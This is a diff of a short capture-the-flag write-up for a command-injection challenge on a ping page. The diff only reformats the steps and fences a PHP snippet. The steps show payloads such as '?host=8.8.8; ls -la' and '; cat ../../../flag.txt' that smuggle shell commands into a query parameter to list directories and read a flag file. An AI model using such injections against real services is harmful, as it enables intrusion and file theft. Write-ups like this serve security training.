@@ -13,10 +13,10 @@
 
 ## Steps done
 
-1 - We visited the url and it returned the message `Command executed: ping -c 2 127.0.0.1` 
-2 - After some tries, we sent the query parameter host with value 8.8.8.8 `?host=8.8.8` and the response was `Command executed: ping -c 2 8.8.8.8`
-3 - After it we tried to inject a command `ls -la` `?host=8.8.8; ls -la` and the reponse contained the directory listing, with the php file 
-
+1. We visited the url and it returned the message `Command executed: ping -c 2 127.0.0.1` 
+2. After some tries, we sent the query parameter host with value 8.8.8.8 `?host=8.8.8` and the response was `Command executed: ping -c 2 8.8.8.8`
+3. After it we tried to inject a command `ls -la` `?host=8.8.8; ls -la` and the reponse contained the directory listing, with the php file 
+```php
     <pre><?php
 
 
@@ -29,6 +29,7 @@
         header('Location: '.$_SERVER['PHP_SELF']."?host=127.0.0.1");
     die;
     }
+```
 
-4 - We checked upper directories with `ls -la ../` and we found a file called flag.txt on  `../../../flag.txt`
-5 - We printed the content of the file with `?host=8.8.8; cat ../../../flag.txt` and we obtained the flag  `TFCCTF{C0mm4nd_1nj3c5i0n_1s_E4sy}`
+4. We checked upper directories with `ls -la ../` and we found a file called flag.txt on  `../../../flag.txt`
+5. We printed the content of the file with `?host=8.8.8; cat ../../../flag.txt` and we obtained the flag  `TFCCTF{C0mm4nd_1nj3c5i0n_1s_E4sy}`
